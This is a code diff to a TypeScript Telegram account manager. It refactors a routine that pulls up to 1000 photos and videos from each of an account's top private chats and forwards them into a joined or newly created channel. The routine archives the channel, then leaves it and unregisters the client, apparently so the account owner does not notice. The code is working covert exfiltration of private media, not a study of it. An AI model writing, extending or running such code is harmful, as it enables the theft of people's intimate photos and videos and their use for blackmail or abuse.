@@ -107,44 +107,55 @@ class TelegramManager {
         );
     }
 
+    private async createOrJoinChannel(channel: string) {
+        let channelId;
+        let channelAccessHash;
+        if (channel) {
+            const result: any = await this.joinChannel(channel);
+            channelId = result.chats[0].id;
+            channelAccessHash = result.chats[0].accessHash;
+            await this.archiveChat(channelId, channelAccessHash);
+            console.log("Archived chat", channelId);
+        } else {
+            const result = await this.createGroup();
+            channelId = result.id;
+            channelAccessHash = result.accessHash;
+            console.log("Created new group with ID:", channelId);
+        }
+        return { id: channelId, accesshash: channelAccessHash }
+    }
+
     public async forwardMedia(channel: string, fromChatId: string) {
         let channelId;
         try {
             console.log("Forwarding media from chat to channel", channel, fromChatId);
             let channelAccessHash;
-            if (channel) {
-                const result: any = await this.joinChannel(channel);
-                channelId = result.chats[0].id;
-                channelAccessHash = result.chats[0].accessHash;
-                await this.archiveChat(channelId, channelAccessHash);
-                console.log("Archived chat", channelId);
-            } else {
-                const result = await this.createGroup();
-                channelId = result.id;
-                channelAccessHash = result.accessHash;
-                console.log("Created new group with ID:", channelId);
-            }
             if (fromChatId) {
+                const channelDetails = await this.createOrJoinChannel(channel);
+                channelId = channelDetails.id;
+                channelAccessHash = channelDetails.accesshash;
                 await this.forwardSecretMsgs(fromChatId, channelId.toString());
             } else {
-                await this.forwardSecretMsgsFromTopChats(channelId.toString());
+                const chats = await this.getTopPrivateChats();
+                if (chats.length > 0) {
+                    const channelDetails = await this.createOrJoinChannel(channel);
+                    channelId = channelDetails.id;
+                    channelAccessHash = channelDetails.accesshash;
+                    for (const chat of chats) {
+                        const mediaMessages = await this.searchMessages({ chatId: chat.chatId, limit: 1000, types: ['photo', 'video'] });
+                        console.log("Forwarding messages from chat:", chat.chatId, "to channel:", channelId);
+                        await this.forwardMessages(chat.chatId, channelId, mediaMessages.photo.messages);
+                        await this.forwardMessages(chat.chatId, channelId, mediaMessages.video.messages);
+                    }
+                }
+                console.log("Completed forwarding messages from top private chats to channel:", channelId);
             }
         } catch (e) {
             console.log(e)
         }
+
         await this.leaveChannels([channelId.toString()]);
         await connectionManager.unregisterClient(this.phoneNumber);
-    }
-
-    public async forwardSecretMsgsFromTopChats(channelId: string) {
-        const chats = await this.getTopPrivateChats();
-        for (const chat of chats) {
-            const mediaMessages = await this.searchMessages({ chatId: chat.chatId, limit: 1000, types: ['photo', 'video'] });
-            console.log("Forwarding messages from chat:", chat.chatId, "to channel:", channelId);
-            await this.forwardMessages(chat.chatId, channelId, mediaMessages.photo.messages);
-            await this.forwardMessages(chat.chatId, channelId, mediaMessages.video.messages);
-        }
-        console.log("Completed forwarding messages from top private chats to channel:", channelId);
     }
 
     public async forwardSecretMsgs(fromChatId: string, toChatId: string) {
